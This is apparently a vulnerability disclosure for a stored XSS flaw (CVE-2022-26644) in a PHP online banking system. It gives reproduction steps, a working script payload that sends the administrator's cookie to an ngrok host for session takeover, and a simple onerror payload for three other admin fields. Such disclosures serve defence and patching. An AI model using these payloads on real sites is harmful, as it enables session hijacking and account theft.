# Tittle: Online Banking System Stored XSS

## Author: (Erik451)

### CVE: [CVE-2022-26644](https://cve.reconshell.com/cve/CVE-2022-26644)
#### **Vendor Homepage**: [https://www.sourcecodester.com/](https://www.sourcecodester.com/)
#### **Software Link**: [Online Banking System](https://www.sourcecodester.com/php/14868/banking-system-using-php-free-source-code.html)
#### **Version**: OBS 1.0



**Description:** A XSS issue in OBS v1.0 allows remote attackers to inject JavaScript in the description parameters. XSS to Privilege Escalation
- Client can craft a malicious payload, when the administrator goes to "account managment menu" the payload will be executed and the administrator cookies will be sent to the attacker server.

---

### Steps to reproduce:
- 1- Go to [http://localhost/banking/client/?page=user](http://localhost/banking/client/?page=user)
- 2- Edite your profile name and paste the payload
- 3- Using a ngrok http server to get the request with the administrator cookie

#### **Client Session**
Payload used to steal the session Cookie: 
```js
<script>var i=new Image;i.src=`https://2c32-81-9-194-204.ngrok.io/?c=${document.cookie}`;</script>
```

![ngrokclient](https://user-images.githubusercontent.com/47476901/160634443-a0b5afaa-a2f0-404f-9bb2-a3437e534c6d.png)


#### **Admin Session**

The administrator goes to the manage accounts menu and will execute the payload in background.
Now we have the admin cookie on the request

![admincookie](https://user-images.githubusercontent.com/47476901/160656693-e8ce72d9-66f1-4635-85df-f1b8042a8e1f.png)

#### **Client Session**
Edit our cookie with the new admin cookie, reload admin page and now we are administrators.

![loginasadmin](https://user-images.githubusercontent.com/47476901/160634399-08084a58-6c77-47b8-97c7-27c9fb274d8c.png)


---

#### Other XSS

Payload used: `<img src="x" onerror=prompt(1)>`

**Announcements Tittle**

-  1- Go to [http://web.com/admin/?page=announcements/manage_announcement](http://web.com/admin/?page=aannouncements/manage_announcement)
-  2- Create or edite an announcement and paste the payload
		
![XSSannouncement](https://user-images.githubusercontent.com/47476901/160634336-a3d0ff72-878b-4102-9eff-5759581f3695.png)
    
![XSSannouncement2](https://user-images.githubusercontent.com/47476901/160634352-303bc621-c09d-4993-86e0-316b183809ab.png)

**Accounts Name**

-  1- Go to [http://web.com/admin/?page=accounts/manage_account](http://web.com/admin/?page=accounts/manage_account)
-  2- Create or edite an accounts and paste the payload, client account will execute the payload on his session.

**System Info Name**	

 -  1- Go to [http://web.com/admin/?page=system_info](http://web.com/admin/?page=system_info)
 -  2- Edite the app/system info and paste the payload
 -  3-  This is the configuration of the app, all clients will see the tittle on the app, the XSS will be executed.
 
![XSSsysinfo](https://user-images.githubusercontent.com/47476901/160634484-659cfb45-6e0e-446a-be77-76296ee56383.png)

